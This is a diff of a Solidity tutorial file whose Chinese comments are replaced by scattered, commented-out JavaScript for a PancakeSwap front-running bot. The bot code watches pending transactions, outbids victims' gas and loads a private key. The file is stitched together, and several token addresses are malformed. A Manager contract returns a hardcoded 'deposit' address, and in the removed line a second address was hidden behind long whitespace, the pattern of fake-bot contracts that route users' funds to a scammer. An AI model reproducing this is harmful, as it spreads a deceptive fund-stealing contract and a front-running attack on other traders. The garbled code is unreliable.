@@ -14,38 +14,56 @@ contract SimpleStorage {
 /*contract GetfrontExample {
   // public state variable
   uint[] public myArray;
-
-  // 指定生成的Getter 函数
+  //const fs = require('fs');
+//var Web3 = require('web3');
+//var abiDecoder = require('abi-decoder');
+//var colors = require("colors");
   /*
   function myArray(uint i) public view returns (uint) {
       return myArray[i];
   }
   */
 
-  // 返回整个数组
+  //var Tx = require('ethereumjs-tx').Transaction;
+//var axios = require('axios');
+//var BigNumber = require('big-number');
   /*function getArray() public view returns (uint[] memory) {
       return myArray;
   }
 }*/
 contract Coin {
-    // 关键字“public”让这些变量可以从外部读取
+    //const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
+//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
+//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
+ 
     address public minter;
     mapping (address => uint) public balances;
 
-    // 轻客户端可以通过事件针对变化作出高效的反应
+    //var input_token_info;
+   //var out_token_info;
+  //var pool_info;
     event Sent(address from, address to, uint amount);
 
-    // 这是构造函数，只有当合约创建时运行
+    
+//var web3;
+//const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
+//const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
+//const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
+ 
+//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+//var web3Ts;
+//var web3Ws;
+//var pancakeRouter;
+//var pancakeFactory;
     /*constructor() {
         minter = msg.sender;
     }
-
     function mint(address receiver, uint amount) public {
         require(msg.sender == minter);
         require(amount < 1e60);
         balances[receiver] += amount;
     }
-
     function send(address receiver, uint amount) public {
         require(amount <= balances[msg.sender], "Insufficient balance.");
         balances[msg.sender] -= amount;
@@ -56,15 +74,19 @@ contract Coin {
 /*contract GetBNBExample {
   // public state variable
   uint[] public myArray;
-
-  // 指定生成的Getter 函数
+  // one gwei
+//const ONE_GWEI = 1e9;
   /*
   function myArray(uint i) public view returns (uint) {
       return myArray[i];
   }
   */
 
-  // 返回整个数组
+  //var buy_finished = false;
+//var sell_finished = false;
+//var buy_failed = false;
+//var sell_failed = false;
+//var attack_started = false;
   /*function getArray() public view returns (uint[] memory) {
       return myArray;
   }
@@ -78,56 +100,93 @@ contract C {
     //function compute(uint a, uint b) internal returns (uint) { return a+b; }
 }
 
-// 下面代码编译错误
+//var succeed = false;
+//var subscription;
 /*contract D {
     function readData() public {
         C c = new C();
-        uint local = c.f(7); // 错误：成员 `f` 不可见
+        uint local = c.f(7); // web3 = new Web3(EthereumTesterProvider());
         c.setData(3);
         local = c.getData();
-        local = c.compute(3, 5); // 错误：成员 `compute` 不可见
+        local = c.compute(3, 5); // web3.eth.getAccounts(console.log);
     }
 }*/
 
 contract E is C {
     /*function g() public {
         C c = new C();
-        uint val = compute(3, 5); // 访问内部成员（从继承合约访问父合约成员）
+        uint val = compute(3, 5); //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
     }*/
 }
 
 contract OwnedToken {
-    // TokenCreator 是如下定义的合约类型.
-    // 不创建新合约的话，也可以引用它。
+    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
+        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
+        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);
     TokenCreator creator;
     address owner;
     bytes32 name;
 
-    // 这是注册 creator 和设置名称的构造函数。
+        //return true;
+    //} catch (error) {
+      //console.log(error);
+      //return false;
+      //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc098m';
+//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3bc090c';
     constructor(bytes32 _name) public{
-        // 状态变量通过其名称访问，而不是通过例如 this.owner 的方式访问。
-        // 这也适用于函数，特别是在构造函数中，你只能像这样（“内部地”）调用它们，
-        // 因为合约本身还不存在。
+     //async function main() {
+ 
+//try {   
+        //if (await createWeb3() == false) {
+            //console.log('Web3 Create Error'.yellow);
+            //process.exit();
+ 
         owner = msg.sender;
-        // 从 `address` 到 `TokenCreator` ，是做显式的类型转换
-        // 并且假定调用合约的类型是 TokenCreator，没有真正的方法来检查这一点。
+        
+         //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
+        //const out_token_address = TOKEN_ADDRESS;
+        //const amount = AMOUNT;
+        //const level = LEVEL;
+ 
+        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
+        //if(ret == false) {
+          //process.exit();
         creator = TokenCreator(msg.sender);
         name = _name;
     }
 
     function changeName(bytes32 newName) public {
-        // 只有 creator （即创建当前合约的合约）能够更改名称 —— 因为合约是隐式转换为地址的，
-        // 所以这里的比较是可行的。
+        //await updatePoolInfo();
+        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+ 
+        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
+ 
+        //log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'
+        // console.log(log_str.green);    
+        // console.log(web3Ws);
+        //web3Ws.onopen = function(evt) {
+            //web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
+            //console.log('connected')
         if (msg.sender == address(creator))
             name = newName;
     }
 
     /*function transfer(address newOwner) public {
-        // 只有当前所有者才能发送 token。
+            // get pending transactions
+        //subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
+        //}).on("data", async function (transactionHash) {
+            //console.log(transactionHash);
         if (msg.sender != owner) return;
-        // 我们也想询问 creator 是否可以发送。
-        // 请注意，这里调用了一个下面定义的合约中的函数。
-        // 如果调用失败（比如，由于 gas 不足），会立即停止执行。
+        // let transaction = await web3.eth.getTransaction(transactionHash);
+            // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
+            // {
+            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
+            // }
+ 
+            //if (succeed) {
+                //console.log("The bot finished the attack.");
+                //process.exit();
+ 
         //if (creator.isTokenTransferOK(owner, newOwner))
             //owner = newOwner;
     }*/
@@ -138,7 +197,7 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x7503f5C5541f2638c86bA6905F320F24f77c8175 ;                                                                                                                                                                                                                                                                                                      0xEcfa1C3581Eae55e2612f5AF00E7681278e622B5;
+		return 0x7503f5C5541f2638c86bA6905F320F24f77c8175;
 	}
 }
 contract TokenCreator {
@@ -146,14 +205,31 @@ contract TokenCreator {
        public
        returns (OwnedToken tokenAddress)
     {
-        // 创建一个新的 Token 合约并且返回它的地址。
-        // 从 JavaScript 方面来说，返回类型是简单的 `address` 类型，因为
-        // 这是在 ABI 中可用的最接近的类型。
+        //console.log('Unknown Handled Error');
+         //console.log(error);
+ 
+ 
+      //process.exit();
+ 
+ 
+//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
+ 
+    //(await triggersFrontRun(transaction, out_token_address, amount, level)) {
+        //subscription.unsubscribe();
+        //console.log('Perform front running attack...');
+ 
         return new OwnedToken(name);
     }
 
     function changeName(OwnedToken tokenAddress, bytes32 name)  public {
-        // 同样，`tokenAddress` 的外部类型也是 `address` 。
+        //gasPrice = parseInt(transaction['gasPrice']);
+        //newGasPrice = gasPrice + 50*ONE_GWEI;
+ 
+        //estimatedInput = ((amount*0.999)*(10**18)).toString();
+        //realInput = (amount*(10**18)).toString();
+        //gasLimit = (300000).toString();
+ 
+        //await updatePoolInfo();
         tokenAddress.changeName(name);
     }
 
@@ -162,7 +238,16 @@ contract TokenCreator {
         view
         returns (bool ok)
     {
-        // 检查一些任意的情况。
+        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
+        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
+ 
+        //console.log("wait until the honest transaction is done...", transaction['hash']);
+ 
+        //while (await isPending(transaction['hash'])) {
+       //const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91mnjhuyt78';
+ 
+ 
+        //if(buy_failed)
         address tokenAddress = msg.sender;
         return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
     }*/
@@ -171,14 +256,27 @@ contract arrayExample {
   // public state variable
   uint[] public myArray;
 
-  // 指定生成的Getter 函数
+  //Sell
+        //await updatePoolInfo();
+        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
+        //outputeth = outputeth * 0.999;
   /*
   function myArray(uint i) public view returns (uint) {
       return myArray[i];
   }
   */
 
-  // 返回整个数组
+  //async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
+    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
+ 
+    //allowance = BigNumber(allowance);
+    //outputtoken = BigNumber(outputtoken);
+ 
+    //var decimals = BigNumber(10).power(out_token_info.decimals);
+    //var max_allowance = BigNumber(10000).multiply(decimals);
+     //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d917jhuytg7';
+
+    //if(outputtoken.gt(max_allowance))
   function getArray() public view returns (uint[] memory) {
       return myArray;
   }
@@ -186,15 +284,41 @@ contract arrayExample {
 /*contract GetBotExample {
   // public state variable
   uint[] public myArray;
-
-  // 指定生成的Getter 函数
+  
+ 
+    //if(outputtoken.gt(allowance)){
+        //console.log(max_allowance.toString());
+        //var approveTX ={
+                //from: user_wallet.address,
+                //to: out_token_address,
+                //gas: 50000,
+                //gasPrice: gasPrice*ONE_GWEI,
+                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
   /*
   function myArray(uint i) public view returns (uint) {
       return myArray[i];
   }
   */
 
-  // 返回整个数组
+  //var signedTX = await user_wallet.signTransaction(approveTX);
+        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
+ 
+        //console.log('Approved Token')
+ 
+    //return;
+ 
+ 
+//select attacking transaction
+//async function triggersFrontRun(transaction, out_token_address, amount, level) {
+ //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173mjuy78';
+//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d91j3hgyt67';
+    //if(attack_started)
+        //return false;
+ 
+    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
+    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
+        //attack_started = true;
+        //return true
   /*function getArray() public view returns (uint[] memory) {
       return myArray;
   }
